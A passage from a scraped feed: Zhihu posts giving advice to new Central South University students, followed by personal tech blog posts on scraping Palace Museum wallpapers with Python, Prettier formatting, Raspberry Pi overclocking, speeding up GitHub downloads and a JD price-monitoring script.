data-rawheight=\"400\" data-watermark=\"original\" data-original-src=\"v2-c0463ef8c1416f189a60d154be09ffa0\" data-watermark-src=\"v2-732369fa1c269be96e490d0c06b870ff\" data-private-watermark-src=\"v2-62e5ed11db5925c1d282217272bf37c2\"></p>\n<p>大家通常将一个人的能力分为软硬两种，软实力是你周围人间接带给你的人脉、资源和朋友圈，说白了就是“你认识谁”；硬实力是你个人的能力，比如学识、学位、交流交往能力、问题解决能力等，这些构成了“你是谁”。</p>\n<p>硬实力是软实力的基础，是你做出选择的勇气，也是可以从教育中获得的最重要的东西。当你自身的“硬件”越好，以后的人生选择就越多，机会自然就越多。所以，在你还不知道该如何选择人生的时候，就埋头苦学，博览群书，当你完成从“我是谁”到“我认识谁”再到“都认识我”的转变时，人生自然会像湘江北去，坦途向前。</p>\n<p><b>二、选择中南，你的依靠会像麓山一样坚实绵延。</b></p>\n<p>我是一个停不住脚的人，四年里时常会外出参加一些活动，也就不免会遇到一些困难麻烦，但每次最能让我心安的，就是学校老师给我的支持——19年我前赴美国参加实习，也正是因为学校的资助才得以成行。我一直觉得中南是一所很宠学生的学校，在疫情隔离、学生资助、校园建设等方面从不亏待她的学子。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-71306672d346331a1a3ff6f0f526614f_720w.jpg?rss\" data-caption=\"（中南大学2021届毕业典礼与田红旗校长合影）\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-71306672d346331a1a3ff6f0f526614f\" data-watermark-src=\"v2-1daa563ef0300952a45b9e40d46d8019\" data-private-watermark-src=\"v2-63d6c88f2b56b9a495cf8c36b7dc5979\"></p>\n<p>如果你有困难，请大胆坚毅地告诉学校，定会获得意想不到的帮助。来到中南大学这样一所学校，意味着你们拥有了更丰富的学术资源、更优秀的老师、更广阔的的人脉资源、更好的就业机会和更高的发展平台。这里允许你尽情发挥自己的想象力和创造力，也请你们珍惜自己在学业科研、学生活动、创新创业等方面迸发出来的激情与创新，依托学院学校平台，勇于实践，综合成长。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a2c018cee8ea942aeb12e77edebabaec_720w.jpg?rss\" data-caption=\"（与时任中国驻联合国副代表吴海涛合影）\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"449\" data-watermark=\"original\" data-original-src=\"v2-a2c018cee8ea942aeb12e77edebabaec\" data-watermark-src=\"v2-42bdeb8128961e375fc41ff2e82b77a6\" data-private-watermark-src=\"v2-135a1138a127d4bdf34ee18e8abbefbd\"></p>\n<p><b>三、享受大学，你的生活要像左家垅的小吃一样丰富多彩。</b></p>\n<p>北京烤鸭、铜锅涮肉、雪莲餐厅、悦购广场、桥头排骨、茶颜悦色、COCO、正粤粥铺、户部巷烤面筋、一只酸奶牛......左家垅的小吃总是眼花缭乱，就像你大学四年的生活一样，酸甜苦辣咸，有人错过、有人离开、有人欣然前来、有人漫步心间。</p>\n<p>你们的大学要丰富多彩：学业、运动、社团、旅行、爱情、眼泪、美食，定义一个优秀大学生的标准是一群能哭能笑能压马路的朋友、出彩的学业、丰富多彩的校园生活、有规律的作息生活、值得骄傲的特长爱好、从心底满溢出来的阳光自信、阴霾困不住的精神气儿、能负担得起的社会责任和能扛得起的民族复兴大旗。</p>\n<p>建议你们每一年都做三件值得让自己骄傲的事情——可以是大事情，比如你拿到了国家奖学金、获得了国家比赛的第一名；也可以是一件非常小的事情，比如拍出了一张好看的相片、认识了一位挚友——只要你努力过、做了对的事，不论大小，幸福感自会沁入心脾的。</p>\n<p><b>四、初入校园，要找寻“欢迎广~临，茶颜~”一般的归属感。</b></p>\n<p>我不知道这声茶颜悦色的招牌金句能不能寄托所有中南人的长沙情结，但之于我，每次在机场车站听到这声音时，就明白我是回了长沙，这是我的归属感。</p>\n<p>在大学里，你们将独自面对整个生活，自己购物、自己洗衣服、自己看医生、自己规划生活、自己面对人生——这是你们青春岁月里迷茫感和孤独感的开始，也自会成为你们变得更加独立更加坚强的精神源泉。而在这四年孤寂岁月里，要记得寻找自己的归属感，你可以选择以寝室为归属、以某个社团为归属、以学生会为归属、以一段感情为归属等等。一群人，同一个目标、一起拼搏、共享欢乐、共度爱与愁，这就是归属感。独立生活的能力和归属感的支持，都将会是帮助你度过青春迷茫的锐利武器。还有，寻得挚友时，别忘了那一句“秋分时节，要多吃坚果，对身体好哦~”</p>\n<p>岳麓山的红叶又扮上新颜，湘江水还是澎湃着诗篇，麓山古寺的敲钟人依旧没换，麓山南路的故事也迎来了新的主演。此去经年，也不知何时再会中南，思无垠念无边，祝你们前程坦荡，敬颂台安。</p>\n<p>李铭泽</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-da-xue-sheng-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国大学生在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469460738/answer/2137162368?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">127 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/282403878?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想知道各类大学，大学生的作息时间表？</a><br><a href=\"http://www.zhihu.com/question/62809443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">普通大学大学生如何在大学期间提高自己？</a><br>\n","link":"http://www.zhihu.com/question/469460738/answer/2137162368?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"理科生觉得哪些知识不知道是文科生的遗憾？","date":"2021-09-26 12:26:06","description":"\n<p>中南大学2021年开学典礼上数学与统计学院院长的发言：</p>\n<p>青年人要立志。根据实数的阿基米德性，只要m不是0，无论m多么小，将很多同样的m加起来，我们可以得到任意大的数。从现在开始确立志向，将无数微小的努力累加，未来将会由我们创造。青年人要勤学。1.02的365次方是1377.4，0.98的365次方是0.0006。当坚持努力时，受益是巨大的；倘若懈怠，带来的后果便是不断退步。青年人要学会抗压。三角函数y=sin  x图像顶点两旁截然不同的走向告诉我们物极必反的道理，希望大家正视挫折、学会调节，拥有健康的身心。</p>\n<p>小中作为一个文科生，只能看懂一部分，剩下的不明觉厉……</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-da-xue-sheng-zai-xian?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国大学生在线</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/270455074/answer/2136803130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1072 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/276989917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">理科生觉得哪些知识不知道是理科生的遗憾？</a><br><a href=\"http://www.zhihu.com/question/266962550?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">作为一个文科生，想了解一些理科的知识，应从什么开始？</a><br>\n","link":"http://www.zhihu.com/question/270455074/answer/2136803130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = 